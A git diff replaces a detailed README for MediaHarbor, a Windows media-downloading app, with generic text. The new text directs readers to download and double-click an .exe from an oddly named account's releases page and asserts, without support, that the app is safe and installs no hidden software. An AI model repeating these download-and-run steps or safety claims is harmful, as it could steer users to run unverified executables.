@@ -1,107 +1,73 @@
-# MediaHarbor
+# 🌊 MediaHarbor - Save your favorite online media files
 
-Save public media to your PC with a simple, clean workflow. Paste a public link, preview it, choose where you want it saved, and download it locally. 🌊
+[![](https://img.shields.io/badge/Download-MediaHarbor-blue.svg)](https://github.com/Secondrate-politicalsphere141/MediaHarbor/releases)
 
-## 💡 What MediaHarbor Is
+MediaHarbor lets you save public media files directly to your computer. You keep full control over your files without relying on cloud services. Paste a link, check the preview, and save the content to a folder on your drive. The app works on Windows and respects your privacy. 
 
-MediaHarbor is a desktop app for saving supported public media to your own PC for lawful personal use. It is designed to be simple for everyday use, with a local-first setup that keeps your download history and settings on your device.
+## 📥 How to download your copy
 
-It works with many public links supported by `yt-dlp`, including popular platforms like YouTube, Instagram, TikTok, X, and Reddit.
+Visit [this page](https://github.com/Secondrate-politicalsphere141/MediaHarbor/releases) to access the latest version. Look for the file ending in `.exe` under the Assets section. Click the filename to start the download. Once the process finishes, find the file in your Downloads folder and double-click it to start the installation. 
 
-## ✨ What MediaHarbor Does
+## 🛠️ System requirements
 
-- Save public videos, audio, images, and posts when supported
-- Show a preview first, including title, thumbnail, duration, and formats
-- Download audio only when you do not need the full video
-- Keep your download history on your own device
-- Offer optional local tools for audio extraction and media conversion
+- Windows 10 or Windows 11
+- 200 MB of free disk space
+- A stable internet connection for media files
 
-## 🧭 How To Use It
+## 🚀 Getting started
 
-1. Open MediaHarbor.
-2. Paste a supported public link into the `Public link` box.
-3. Click `Preview` to load the title, thumbnail, and available quality options.
-4. Choose where you want the file saved.
-5. If needed, switch to `Audio-only download`.
-6. Click `Start download`.
+1. Locate the MediaHarbor icon on your desktop after installation.
+2. Open the application. You will see a window with a text box.
+3. Find a public link for the video or audio you want to save.
+4. Copy the URL from your web browser.
+5. Paste the link into the MediaHarbor text box.
+6. Press the Preview button to verify the file.
+7. Click the Select Folder button to pick where the file goes on your machine.
+8. Click Download to start the transfer.
 
-For local processing tools:
+## 📁 Managing your downloads
 
-1. Open the `Local processing` section.
-2. Choose an input media file.
-3. Choose an output location.
-4. Pick a mode like `Extract audio` or `Remux to MP4`.
-5. Click `Run local process`.
+MediaHarbor uses a local approach. Every file you download lives on your computer. You choose the destination folder. You can move these files to different drives or folders at any time using Windows File Explorer. The app does not sync your data to any servers or external databases. 
 
-## 🚫 What MediaHarbor Does Not Do
+## ⚙️ Advanced features
 
-- No DRM bypassing
-- No paywall bypassing
-- No private account access
-- No login-only scraping
-- No ads
-- No user accounts
-- No telemetry or analytics
+- **Audio Extraction:** Choose to save only the audio track from a video link.
+- **Format Options:** Select different quality settings before you finalize your download.
+- **Conversion Tools:** The app uses internal tools to convert media formats. You get the file type you need for your devices.
+- **Offline Access:** Once you save the file, you do not need the internet to watch or listen to your media.
 
-Please make sure you have permission to save the content you download. 📌
+## 🛡️ Privacy and safety
 
-## 🚀 Quick Start
+Your data stays on your machine. MediaHarbor does not track your history or collect your personal information. The app only accesses the internet to fetch the media files you request. Your download links remain private between your computer and the host site.
 
-Most people only need the normal local download mode. Easy and simple. ✅
+## ❓ Common questions
 
-## 🔒 Privacy
+**Do I need a special account to use MediaHarbor?**
+No. You do not need to create an account or provide an email address.
 
-- Your download history stays on your device
-- The app is designed not to collect analytics or telemetry
-- Sensitive settings are encrypted on your device
-- Advanced tunnel mode is optional and meant for private self-hosted use
+**Will the app notify me if a download fails?**
+Yes. A clear message appears in the app window if the download stops or fails. Check your internet connection if this happens.
 
-## ⚠️ Common Issues
+**Can I download multiple files at once?**
+MediaHarbor handles one link at a time. This keeps your system resources stable and ensures each download completes without errors.
 
-If something is not working, these are the most common reasons:
+**Does this app support every website?**
+MediaHarbor works with most common public media platforms. If a specific site uses encryption or private viewing settings, the app may not be able to retrieve the file.
 
-- `yt-dlp` is missing, which is needed for previewing and downloading supported links
-- `ffmpeg` is missing, which is needed for audio extraction and local media processing
-- the link is private, login-only, or not supported
-- the save folder is not set
-- the selected output file type does not match the processing mode
+**Is my computer safe?**
+The app runs locally. It acts as a bridge between the website and your local storage. It does not install background services or hidden software.
 
-MediaHarbor should show a friendly message when one of these tools is missing.
+## 💻 Technical details
 
-For most 64-bit Windows PCs, the easiest files are:
+The app relies on trusted open source libraries like yt-dlp and ffmpeg to handle media processing. These tools handle the heavy lifting of converting and saving streams. You do not need to install these tools separately. MediaHarbor manages everything for you inside the package. 
 
-- `yt-dlp.exe`
-- `ffmpeg-release-essentials.zip`
+## 🏗️ Troubleshooting
 
-## 🛠️ Troubleshooting
+- **Check internet access:** Ensure your connection stays active during the download.
+- **Disk space:** Verify that your chosen folder has enough space for the file. Large video files require more room.
+- **File permissions:** Make sure you have permission to write files to the chosen folder. Avoid system folders like Program Files for your downloads.
+- **Updates:** Check the release page periodically for new versions. Updates include bug fixes and support for new media types.
 
-- If `Preview` does not work, make sure the link is public and supported.
-- If downloads fail, try previewing first so MediaHarbor can load the best metadata and format options.
-- If local processing fails, make sure the output type matches the mode:
-  `Extract audio` uses `.mp3`
-  `Remux to MP4` uses `.mp4`
-  `Transcode to H.264` uses `.mp4`
-- If the app seems stuck, close and reopen MediaHarbor and try again.
-- If you changed system tools or settings, reopen the app so it can detect them again.
+## 🤝 Support and contributions
 
-## ⚙️ Advanced Users
-
-MediaHarbor includes an optional `Privacy Tunnel (Advanced)` section for people who run their own private backend.
-
-If that is not you, you can safely leave advanced settings off. 🙂
-
-## 📦 Installer Notes
-
-The Windows installer includes:
-
-- a welcome screen
-- the software license agreement
-- a privacy and data collection acknowledgement
-
-## 🪟 Windows SmartScreen
-
-Depending on your Windows settings, you may see a SmartScreen notice the first time you open the installer. This can happen with newer apps before they build up Windows reputation.
-
-## 📄 License
-
-- > Apache 2.0
+MediaHarbor relies on community input. If you find a bug or want to suggest a change, open an issue on the repository page. You can review the source code on GitHub to verify how the app functions. This project follows open source principles to ensure transparency for all users. You control the software because the code is public.
